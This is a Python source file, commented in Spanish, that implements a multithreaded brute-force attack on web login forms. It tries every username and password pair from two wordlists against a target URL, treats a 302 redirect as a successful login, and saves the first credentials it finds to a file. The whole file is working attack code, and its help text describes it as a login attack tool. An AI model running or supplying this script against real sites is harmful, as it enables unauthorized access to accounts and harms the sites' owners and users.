import requests
import argparse
import concurrent.futures

def brute_force_login(url, users_file, passwords_file, output_file, max_workers=10):
    # Leer la lista de usuarios desde el archivo
    with open(users_file, 'r') as users:
        usernames = users.readlines()

    # Leer la lista de contraseñas desde el archivo
    with open(passwords_file, 'r') as passwords:
        pass_list = passwords.readlines()

    # Crear una sesión persistente para reducir la sobrecarga de conexión
    session = requests.Session()

    def check_credentials(user, password):
        # Construir los datos de la solicitud POST
        data = {
            'username': user.strip(),
            'password': password.strip()
        }

        # Realizar la solicitud POST y deshabilitar las redirecciones automáticas
        response = session.post(url, data=data, allow_redirects=False)

        # Verificar si las credenciales son válidas
        if response.status_code == 302:
            result = f"[+] Credenciales encontradas: Usuario - {user}, Contraseña - {password}"
            print(result)
            return True, result
        return False, None

    # Utilizar múltiples hilos para enviar solicitudes concurrentemente
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for user in usernames:
            for password in pass_list:
                futures.append(executor.submit(check_credentials, user, password))

        # Esperar a que se completen todas las tareas
        for future in concurrent.futures.as_completed(futures):
            found, result = future.result()
            if found:
                with open(output_file, 'a') as f:
                    f.write(result + '\n')
                return  # Detener el proceso después de encontrar las credenciales

    # Si no se encontraron credenciales válidas
    print("[-] No se encontraron credenciales válidas")

if __name__ == '__main__':
    # Configurar el analizador de argumentos de línea de comandos
    parser = argparse.ArgumentParser(description="Script de fuerza bruta para ataque de inicio de sesión")
    parser.add_argument("url", help="URL del formulario de inicio de sesión")
    parser.add_argument("users_file", help="Ruta del archivo que contiene la lista de usuarios")
    parser.add_argument("passwords_file", help="Ruta del archivo que contiene la lista de contraseñas")
    parser.add_argument("--output-file", default="brute_force_results.txt", help="Ruta del archivo de salida para almacenar los resultados (por defecto: brute_force_results.txt)")
    parser.add_argument("--max-workers", type=int, default=10, help="Número máximo de hilos para procesar las solicitudes (por defecto: 10)")
    args = parser.parse_args()

    # Llamar a la función de ataque de fuerza bruta
    brute_force_login(args.url, args.users_file, args.passwords_file, args.output_file, args.max_workers)
